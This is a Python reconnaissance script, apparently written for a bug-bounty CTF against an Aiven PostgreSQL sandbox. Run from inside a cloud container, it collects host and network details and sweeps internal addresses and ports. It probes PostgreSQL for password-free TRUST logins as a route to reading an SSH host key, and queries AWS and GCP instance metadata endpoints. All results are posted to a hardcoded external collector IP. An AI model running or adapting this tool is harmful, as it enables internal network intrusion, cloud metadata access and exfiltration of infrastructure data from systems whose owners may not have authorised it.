#!/usr/bin/env python3
"""probe6 - internal-address sweep for the CTF lane, run from inside an Aiven runtime container.

Purpose: the public probes for this same challenge enumerate *private* addresses and node-level service
ports we never tried. PostgreSQL's pg_hba can carry a permissive rule (trust/peer) for internal source
addresses, which would be invisible from the public internet; the objective (reading the sandbox's SSH
host key) is exactly what a superuser PG session yields via pg_read_file. So the question this probe
answers is: from inside Aiven, is any of the sandbox's private addresses or node ports reachable, and if
so what auth method does it offer?

Targets come from the public artifact trail (giga-gap-bb/aiven-probe-s54 ALLOW_HOSTS/ALLOW_PORTS), plus
our own certificate-derived address. Nothing outside that list is contacted; every connect is a single
TCP attempt with a short timeout, no credentials are sent.

Results are POSTed to the collector and also served on :8080.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt6"
FALCON_PUBLIC = "193.122.235.156"
HOSTS = [
    FALCON_PUBLIC,                       # current public address of the in-scope CTF host
    "129.213.97.171",                    # public address seen by another researcher (2026-10-05)
    "132.145.163.127",                   # public address seen by another researcher (2026-09-25)
    "10.1.0.204", "10.1.47.111",         # private addresses from that researcher's allowlist
    "172.31.28.65",                      # AWS-style private address from the same list
    "10.1.8.115",                        # private address derived from the CTF's own TLS certificate
    "fda7:a938:5bfe:5fa6:0:5e4:c451:eba9",   # ULA from the same list
]
PORTS = [22, 80, 443, 5432, 12691, 12692, 8080, 21911, 21912, 9701, 9680, 9955]
NAMES = [
    "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
    "public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
    "dr-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
    "dr-public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com",
    "n-falcon-bug-bounty-flag-pgsql-4.e.aivencloud.com",
    "falcon-bug-bounty-flag-pgsql-4.dev-sandbox.aiven.local",
    "falcon-bug-bounty-flag-pgsql-dev-sandbox.dev-sandbox.aiven.local",
    "api.aiven.io", "metadata.google.internal", "kubernetes.default.svc",
]
AUTH = {0: "TRUST", 3: "CLEARTEXT", 5: "MD5", 7: "GSS", 9: "SSPI", 10: "SCRAM"}
RESULTS = {"stage": "start", "facts": {}, "dns": {}, "tcp": {}, "pg": {}, "notes": []}


def sh(cmd, t=8):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:1200]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def facts():
    f = RESULTS["facts"]
    f["hostname"] = sh("hostname")
    f["ip"] = sh("ip -4 addr 2>/dev/null | grep -E 'inet ' || ifconfig 2>/dev/null | grep 'inet '")
    f["ip6"] = sh("ip -6 addr 2>/dev/null | grep -E 'inet6' | head -6")
    f["hosts"] = sh("cat /etc/hosts")
    f["resolv"] = sh("cat /etc/resolv.conf")
    f["route"] = sh("ip route 2>/dev/null | head -6")
    f["egress4"] = sh("curl -s -m 8 https://ifconfig.me/ 2>&1 | head -c 60")
    f["egress6"] = sh("curl -s -m 8 https://ifconfig.co/ 2>&1 | head -c 60")
    f["api_aiven"] = sh("curl -s -m 8 -o /dev/null -w '%{http_code}' https://api.aiven.io/ 2>&1")
    return f


def dns():
    for n in NAMES:
        try:
            rows = sorted({(r[4][0]) for r in socket.getaddrinfo(n, None)})
            RESULTS["dns"][n] = rows
        except Exception as e:                                          # noqa: BLE001
            RESULTS["dns"][n] = type(e).__name__
    return RESULTS["dns"]


def tcp_probe(host, port, timeout=3.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        t0 = time.time()
        s.connect((host, port))
        ms = int((time.time() - t0) * 1000)
        banner = b""
        if port in (22, 80, 443, 5432, 12691, 12692, 21911, 21912):
            try:
                if port == 22:
                    banner = s.recv(64)
                else:
                    s.sendall(struct.pack("!ii", 8, 80877103))
                    banner = s.recv(8)
            except Exception:                                           # noqa: BLE001
                pass
        s.close()
        return {"state": "open", "ms": ms, "banner": banner[:48].decode("latin1", "replace")}
    except socket.timeout:
        return {"state": "timeout"}
    except Exception as e:                                              # noqa: BLE001
        return {"state": type(e).__name__}


def pg_auth(host, port, user, db="defaultdb", use_tls=True, timeout=6):
    """Read the auth method the server offers - TRUST means no credential is needed."""
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        mode = "tls"
        if use_tls:
            s.sendall(struct.pack("!ii", 8, 80877103))
            r = s.recv(1)
            if r != b"S":
                s.close()
                return "ssl-refused(%r)" % r
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname="falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com")
        else:
            mode = "no-tls"
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", db), ("application_name", "aiven-bugbounty/1.0 (Bugcrowd-zllr)")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        for _ in range(4):
            h = s.recv(5)
            if len(h) < 5:
                s.close()
                return "%s: closed" % mode
            n = struct.unpack("!i", h[1:5])[0]
            p = b""
            while len(p) < n - 4:
                c = s.recv(n - 4 - len(p))
                if not c:
                    break
                p += c
            if h[:1] == b"R":
                code = struct.unpack("!i", p[:4])[0]
                s.close()
                return "%s: %s" % (mode, AUTH.get(code, "code %d" % code))
            if h[:1] == b"E":
                m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
                s.close()
                return "%s: error %s" % (mode, m[:60])
            if h[:1] == b"v":
                continue
        s.close()
        return "%s: no auth message" % mode
    except Exception as e:                                              # noqa: BLE001
        return "%s: %s" % ("tls" if use_tls else "no-tls", type(e).__name__)


def work():
    facts()
    dns()
    RESULTS["stage"] = "tcp"
    for host in HOSTS:
        for port in PORTS:
            r = tcp_probe(host, port)
            RESULTS["tcp"]["%s:%d" % (host, port)] = r
            if r.get("state") == "open" and port in (5432, 12691, 12692, 21911, 21912, 9701, 9680, 9955):
                RESULTS["stage"] = "pg"
                for user in ("avnadmin", "ctf", "postgres"):
                    RESULTS["pg"]["%s:%d/%s" % (host, port, user)] = pg_auth(host, port, user)
    RESULTS["stage"] = "metadata"
    RESULTS["notes"].append("aws imdsv2: " + sh(
        "TOK=$(curl -s -m 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token); "
        "echo token=${TOK:0:12}; curl -s -m 4 -H \"X-aws-ec2-metadata-token: $TOK\" "
        "http://169.254.169.254/latest/meta-data/instance-id 2>&1 | head -c 80"))
    RESULTS["notes"].append("gcp metadata: " + sh(
        "curl -s -m 4 -H 'Metadata-Flavor: Google' -o /tmp/m -w 'HTTP %{http_code} ' "
        "http://169.254.169.254/computeMetadata/v1/instance/hostname; head -c 60 /tmp/m 2>/dev/null"))
    RESULTS["stage"] = "done"
    RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def serve():
    HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()


threading.Thread(target=serve, daemon=True).start()
time.sleep(2)
work()
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=15)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:4000])
while True:                       # keep serving for retrieval
    time.sleep(60)
